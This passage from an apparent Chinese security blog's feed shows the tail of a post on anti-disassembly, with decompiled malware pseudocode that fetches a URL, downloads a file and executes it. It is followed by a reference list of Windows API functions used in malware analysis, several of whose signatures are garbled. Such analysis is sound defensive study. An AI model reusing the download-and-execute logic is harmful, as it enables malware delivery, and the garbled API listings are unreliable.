 DWORD dwNumberOfBytesRead; <span class="comment">// [sp+101B8h] [bp-104h]@17</span></div><div class="line">  <span class="keyword">char</span> name[<span class="number">256</span>]; <span class="comment">// [sp+101BCh] [bp-100h]@3</span></div><div class="line">  Buffer = <span class="number">0</span>;</div><div class="line">  <span class="built_in">memset</span>(&amp;v10, <span class="number">0</span>, <span class="number">0xFFFC</span>u);</div><div class="line">  v11 = <span class="number">0</span>;</div><div class="line">  v12 = <span class="number">0</span>;</div><div class="line">  <span class="keyword">if</span> ( WSAStartup(<span class="number">0x202</span>u, &amp;WSAData) )</div><div class="line">  &#123;</div><div class="line">    result = <span class="number">-1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( gethostname(name, <span class="number">256</span>) )     <span class="comment">//获取主机名</span></div><div class="line">  &#123;</div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> &amp;&amp; name[i]; ++i )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">switch</span> ( name[i] )                <span class="comment">//比较，不是Z，z，9的话就加1</span></div><div class="line">      &#123;</div><div class="line">        <span class="keyword">case</span> <span class="string">'Z'</span>:</div><div class="line">          name[i] = <span class="string">'A'</span>;</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="string">'z'</span>:</div><div class="line">          name[i] = <span class="string">'a'</span>;</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="string">'9'</span>:</div><div class="line">          name[i] = <span class="string">'0'</span>;</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">          ++name[i];</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    hInternet = InternetOpenA(name, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">    v4 = (<span class="keyword">const</span> CHAR *)URL();</div><div class="line">    hFile = InternetOpenUrlA(hInternet, v4, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">    <span class="keyword">if</span> ( hFile &amp;&amp; InternetReadFile(hFile, &amp;Buffer, <span class="number">0xFFFF</span>u, &amp;dwNumberOfBytesRead) )</div><div class="line">    &#123;</div><div class="line">      InternetCloseHandle(hFile);</div><div class="line">      Str = <span class="built_in">strstr</span>(&amp;Buffer, SubStr);</div><div class="line">      <span class="keyword">if</span> ( Str )</div><div class="line">      &#123;</div><div class="line">        *<span class="built_in">strstr</span>(Str, asc_40303C) = <span class="number">0</span>;           <span class="comment">// 判断SubStr是否存在Buf中</span></div><div class="line">        Filename = Exe();</div><div class="line">        lpBuffer = <span class="built_in">malloc</span>(<span class="number">0xA00000</span>u);</div><div class="line">        Str += <span class="number">8</span>;</div><div class="line">        hFile = InternetOpenUrlA(hInternet, Str, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">        <span class="keyword">if</span> ( InternetReadFile(hFile, (LPVOID)lpBuffer, <span class="number">0x10000</span>u, &amp;dwNumberOfBytesRead) )</div><div class="line">        &#123;</div><div class="line">          <span class="keyword">if</span> ( dwNumberOfBytesRead )</div><div class="line">          &#123;</div><div class="line">            File = fopen(Filename, Mode);</div><div class="line">            fwrite(lpBuffer, dwNumberOfBytesRead, <span class="number">1u</span>, File);  <span class="comment">//写入文件</span></div><div class="line">            fclose(File);</div><div class="line">            ShellExecuteA(<span class="number">0</span>, <span class="number">0</span>, Filename, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>);       <span class="comment">//执行</span></div><div class="line">          &#125;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      result = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="built_in">printf</span>(aInternetUnable);</div><div class="line">      result = <span class="number">-1</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">printf</span>(Format);</div><div class="line">    result = <span class="number">-1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-什么是反汇编对抗技术&quot;&gt;&lt;a href=&quot;#1-什么是反汇编对抗技术&quot; class=&quot;headerlink&quot; title=&quot;1.什么是反汇编对抗技术&quot;&gt;&lt;/a&gt;1.什么是反汇编对抗技术&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;对抗反汇编技术就是在程序中使用一些特殊的代码或者数据，让反汇编工具产生不正确的程序代码列表，这种技术由恶意软件编写者手工构造。对抗反汇编的时候，编写者会创建一段代码序列，欺骗反汇编器，使得反汇编器生成与正常代码不同的代码。一般的对抗反汇编的技术利用的是反汇编器的自身反汇编的缺陷来实施的&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows API 函数</title>
    <link href="http://yoursite.com/2018/02/10/Windows_API_%E5%87%BD%E6%95%B0/"/>
    <id>http://yoursite.com/2018/02/10/Windows_API_函数/</id>
    <published>2018-02-10T07:45:11.000Z</published>
    <updated>2018-03-15T11:29:00.965Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>Windows API 就是windows应用程序接口，是针对microsoft windows操作系统家族的系统编程接口，这样的系统包括Windows 8.1,Windows 8,Windows 7,Windows Vista、Windows XP、Windows Server 2012、Windows 2008 R2 、Windows Server 2003、Windows 2000、Windows 95、Windows 98、Windows Me(Millennium Editon)和Windows CE等几乎所有版本。</strong><br><a id="more"></a></p><h2 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess()"></a>CreateProcess()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>创建一个新的进程及其主线程。新进程在调用进程的安全上下文中运行。</strong><br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI CreateProcess（</div><div class="line">  <span class="variable">_In_opt_</span> LPCTSTR lpApplicationName，  <span class="comment">//要执行的模块的名称。这个模块可以是基于Windows的应用程序</span></div><div class="line">  <span class="variable">_Inout_opt_</span> LPTSTR lpCommandLine，</div><div class="line">  <span class="variable">_In_opt_</span> LPSECURITY_ATTRIBUTES lpProcessAttributes， <span class="comment">//指向安全令牌的指针</span></div><div class="line">  <span class="variable">_In_opt_</span> LPSECURITY_ATTRIBUTES lpThreadAttributes，  <span class="comment">//指向SECURITY_ATTRIBUTES结构的指针， 用于确定是否可以由子进程继承返回的新线程对象的句柄。</span></div><div class="line">  <span class="variable">_In_</span> BOOL bInheritHandles，</div><div class="line">  <span class="variable">_In_</span> DWORD dwCreationFlags，</div><div class="line">  <span class="variable">_In_opt_</span> LPVOID lpEnvironment，</div><div class="line">  <span class="variable">_In_opt_</span> LPCTSTR lpCurrentDirectory，               <span class="comment">//进程当前目录的完整路径。该字符串也可以指定一个UNC路径</span></div><div class="line">  <span class="variable">_In_</span> LPSTARTUPINFO lpStartupInfo，</div><div class="line">  <span class="variable">_Out_</span> LPPROCESS_INFORMATION lpProcessInformation</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>返回值：函数成功返回进程句柄，失败返回NULL。</p><h2 id="PeekNamedPipe"><a href="#PeekNamedPipe" class="headerlink" title="PeekNamedPipe()"></a>PeekNamedPipe()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>将自已命名或匿名管道的数据复制到缓冲区中。</strong><br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI PeekNamedPipe（</div><div class="line">  <span class="variable">_HANDLE</span> hNamedPipe，  <span class="comment">//管道的句柄。此参数可以是由CreateNamedPipe或 CreateFile函数返回的命名管道实例的句柄 ，也可以是由CreatePipe函数返回的匿名管道读取端的句柄 。该句柄必须具有对管道的GENERIC_READ访问权限。</span></div><div class="line">  <span class="variable">_Out_opt_</span> LPVOID lpBuffer，<span class="comment">//指向缓冲区的指针，用于接收从管道读取的数据。</span></div><div class="line">  <span class="variable">_In_</span> DWORD nBufferSize，</div><div class="line">  <span class="variable">_Out_opt_</span> LPDWORD lpBytesRead，</div><div class="line">  <span class="variable">_Out_opt_</span> LPDWORD lpTotalBytesAvail，</div><div class="line">  <span class="variable">_Out_opt_</span> LPDWORD lpBytesLeftThisMessage</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，返回值是非零的。调用失败返回NULL。</p><h2 id="TerminateThread"><a href="#TerminateThread" class="headerlink" title="TerminateThread()"></a>TerminateThread()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>终止一个线程</strong><br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI TerminateThread（</div><div class="line">  <span class="variable">_Inout_</span> HANDLE hThread，</div><div class="line">  <span class="variable">_In_</span> DWORD dwExitCode  <span class="comment">//退出代码</span></div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，返回值是非零的。调用失败返回0。</p><h2 id="InternetOpenUrl"><a href="#InternetOpenUrl" class="headerlink" title="InternetOpenUrl()"></a>InternetOpenUrl()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;打开由完整的FTP或HTTP URL指定的资源。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">HINTERNET InternetOpenUrl（</div><div class="line">  <span class="variable">_In_</span> HINTERNET hInternet，  <span class="comment">//InternetOpen返回的句柄</span></div><div class="line">  <span class="variable">_In_</span> LPCTSTR lpszUrl，      <span class="comment">//URL</span></div><div class="line">  <span class="variable">_In_</span> LPCTSTR lpszHeaders，</div><div class="line">  <span class="variable">_In_</span> DWORD dwHeadersLength，</div><div class="line">  <span class="variable">_In_</span> DWORD dwFlags，        <span class="comment">//flag</span></div><div class="line">  <span class="variable">_In_</span> DWORD_PTR dwContext</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果连接成功建立，则返回URL的有效句柄; 如果连接失败，则返回NULL。</p><h2 id="InternetOpen"><a href="#InternetOpen" class="headerlink" title="InternetOpen()"></a>InternetOpen()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>初始化应用程序对WinINet函数的使用。只关注与InternetOpenUrl的区别</strong></p><h2 id="FtpPutFile"><a href="#FtpPutFile" class="headerlink" title="FtpPutFile()"></a>FtpPutFile()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在FTP服务器上存储文件。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">BOOL FtpPutFile（</div><div class="line">  <span class="variable">_In_</span> HINTERNET hConnect，         <span class="comment">//句柄</span></div><div class="line">  <span class="variable">_In_</span> LPCTSTR lpszLocalFile，      <span class="comment">//指向包含要从本地系统发送的文件的名称的以空字符结尾的字符串。</span></div><div class="line">  <span class="variable">_In_</span> LPCTSTR lpszNewRemoteFile，  <span class="comment">//指向包含要在远程系统上创建的文件的名称的以空字符结尾的字符串。</span></div><div class="line">  <span class="variable">_In_</span> DWORD dwFlags，</div><div class="line">  <span class="variable">_In_</span> DWORD_PTR dwContext</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果成功返回TRUE，否则返回FALSE。</p><h2 id="RaiseException"><a href="#RaiseException" class="headerlink" title="RaiseException()"></a>RaiseException()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在调用线程中主动引发异常。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void WINAPI RaiseException（</div><div class="line">  <span class="variable">_In_</span> DWORD dwExceptionCode，</div><div class="line">  <span class="variable">_In_</span> DWORD dwExceptionFlags，</div><div class="line">  <span class="variable">_In_</span> DWORD nNumberOfArguments，</div><div class="line">  <span class="variable">_In_</span>  const ULONG_PTR * lpArguments</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>这个函数不会返回一个值。</p><h2 id="IsWow64Process"><a href="#IsWow64Process" class="headerlink" title="IsWow64Process()"></a>IsWow64Process()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;确定指定的进程是否在WOW64下运行 。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI IsWow64Process（</div><div class="line">  <span class="variable">_In_</span> HANDLE hProcess，</div><div class="line">  <span class="variable">_Out_</span> PBOOL Wow64Process  <span class="comment">//如果进程在WOW64下运行，则指向设置为TRUE的值的指针。如果进程在32位Windows下运行，则该值设置为FALSE。如果该进程是在64位Windows下运行的64位应用程序，则该值也设置为FALSE。</span></div><div class="line">）;</div><div class="line"><span class="comment">//wow64是指64位中的32位子系统，目的是为了在64中能运行32的程序。</span></div></pre></td></tr></table></figure></p><p>如果函数成功，则返回值是非零值。</p><h2 id="ShellExecute（）"><a href="#ShellExecute（）" class="headerlink" title="ShellExecute（）"></a>ShellExecute（）</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对指定的文件执行操作。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">HINSTANCE ShellExecute（</div><div class="line">  <span class="variable">_In_opt_</span> HWND hwnd，</div><div class="line">  <span class="variable">_In_opt_</span> LPCTSTR lpOperation，</div><div class="line">  <span class="variable">_In_</span> LPCTSTR lpFile，</div><div class="line">  <span class="variable">_In_opt_</span> LPCTSTR lpParameters，</div><div class="line">  <span class="variable">_In_opt_</span> LPCTSTR lpDirectory，</div><div class="line">  <span class="variable">_In_</span> INT nShowCmd</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，则返回大于32的值。如果该函数失败，它将返回一个错误值</p><h2 id="EnumProcesses"><a href="#EnumProcesses" class="headerlink" title="EnumProcesses"></a>EnumProcesses</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;检索系统中每个过程对象的过程标识符。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI EnumProcesses（</div><div class="line">  <span class="variable">_Out_</span> DWORD * pProcessIds，    <span class="comment">//接收进程标志符数组的指针</span></div><div class="line">  <span class="variable">_In_</span> DWORD cb，                <span class="comment">//数组大小</span></div><div class="line">  <span class="variable">_Out_</span> DWORD * pBytesReturned</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，返回值为非零。</p><h2 id="SetPriorityClass"><a href="#SetPriorityClass" class="headerlink" title="SetPriorityClass"></a>SetPriorityClass</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置指定进程的优先级。该值与进程每个线程的优先级值一起确定每个线程的基本优先级。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI SetPriorityClass（</div><div class="line">  <span class="variable">_In_</span> HANDLE hProcess，       <span class="comment">//处理过程的句柄。</span></div><div class="line">  <span class="variable">_In_</span> DWORD dwPriorityClass   <span class="comment">//该进程的优先级。该参数可以是以下值之一</span></div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，返回值为非零。如果函数失败，返回值为零。<br><a href="https://msdn.microsoft.com/en-us/library/ms686219(VS.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/ms686219(VS.85).aspx</a></p><h2 id="SetThreadPriority"><a href="#SetThreadPriority" class="headerlink" title="SetThreadPriority"></a>SetThreadPriority</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置指定线程的优先级值。该值与线程进程的优先级一起决定线程的基本优先级。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">BOOL</span> WINAPI SetThreadPriority（</div><div class="line">  在_HANDLE hThread中，      <span class="comment">//要设置其优先级值的线程的句柄。</span></div><div class="line">  标签：APIWinHTTP  <span class="keyword">INT</span>     nPriority</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，返回值为非零。<br><a href="https://msdn.microsoft.com/en-us/library/ms686277(VS.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/ms686277(VS.85).aspx</a></p><h2 id="StartServiceCtrlDispatcher"><a href="#StartServiceCtrlDispatcher" class="headerlink" title="StartServiceCtrlDispatcher"></a>StartServiceCtrlDispatcher</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将服务进程的主线程连接到服务控制管理器，从而使线程成为调用进程的服务控制调度程序线程。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> WINAPI StartServiceCtrlDispatcher（</div><div class="line">  _In_  <span class="keyword">const</span> SERVICE_TABLE_ENTRY * lpServiceTable  <span class="comment">//指向SERVICE_TABLE_ENTRY结构数组的指针， 其中包含可在调用过程中执行的每个服务的一个条目。表中最后一项的成员必须具有NULL值才能指定表的结尾。</span></div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，返回值为非零。<br><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms686324(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/ms686324(v=vs.85).aspx</a></p><h2 id="UpdateResource"><a href="#UpdateResource" class="headerlink" title="UpdateResource"></a>UpdateResource</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;增加 删除 或替文件中的资源。</p><h2 id="GetIfTable"><a href="#GetIfTable" class="headerlink" title="GetIfTable"></a>GetIfTable</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该 GetIfTable函数检索MIB-II接口表。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">DWORD GetIfTable（</div><div class="line">  <span class="variable">_Out_</span> PMIB_IFTABLE pIfTable，  <span class="comment">//指向缓冲区的指针，该缓冲区以MIB_IFTABLE结构接收接口表 。</span></div><div class="line">  <span class="variable">_Inout_</span> PULONG pdwSize，       <span class="comment">//在输入时，指定由pIfTable参数指向的缓冲区的大小（以字节为单位）。</span></div><div class="line">在输出中，如果缓冲区不足以容纳返回的接口表，则函数将此参数设置为等于所需的缓冲区大小（以字节为单位）。</div><div class="line">  <span class="variable">_In_</span> BOOL bOrder</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，则返回值为NO_ERROR。<br><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa365943(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/aa365943(v=vs.85).aspx</a></p><h2 id="SHDeleteKey"><a href="#SHDeleteKey" class="headerlink" title="SHDeleteKey"></a>SHDeleteKey</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;删除子项及其所有子项。该函数从注册表中删除密钥和所有密钥的值。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">LSTATUS SHDeleteKey（</div><div class="line">  <span class="variable">_In_</span> HKEY hkey，</div><div class="line">  <span class="variable">_In_opt_</span> LPCTSTR pszSubKey  <span class="comment">//以空字符结尾的字符串的地址，指定要删除的键的名称。</span></div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果成功则返回ERROR_SUCCESS，<br><a href="https://msdn.microsoft.com/en-us/library/bb773486(VS.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/bb773486(VS.85).aspx</a></p><h2 id="RegisterServiceCtrlHandler"><a href="#RegisterServiceCtrlHandler" class="headerlink" title="RegisterServiceCtrlHandler"></a>RegisterServiceCtrlHandler</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注册一个函数来处理扩展的服务控制请求。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">SERVICE_STATUS_HANDLE WINAPI RegisterServiceCtrlHandlerEx（</div><div class="line">  <span class="variable">_In_</span> LPCTSTR lpServiceName，  由调用线程运行的服务的名称。</div><div class="line">  <span class="variable">_In_</span> LPHANDLER_FUNCTION_EX lpHandlerProc，  <span class="comment">//指向要注册的处理函数的指针。</span></div><div class="line">  <span class="variable">_In_opt_</span> LPVOID lpContext</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，则返回值是一个服务状态句柄。<br><a href="https://msdn.microsoft.com/en-us/library/ms685058.aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/ms685058.aspx</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;Windows API 就是windows应用程序接口，是针对microsoft windows操作系统家族的系统编程接口，这样的系统包括Windows 8.1,Windows 8,Windows 7,Windows Vista、Windows XP、Windows Server 2012、Windows 2008 R2 、Windows Server 2003、Windows 2000、Windows 95、Windows 98、Windows Me(Millennium Editon)和Windows CE等几乎所有版本。&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
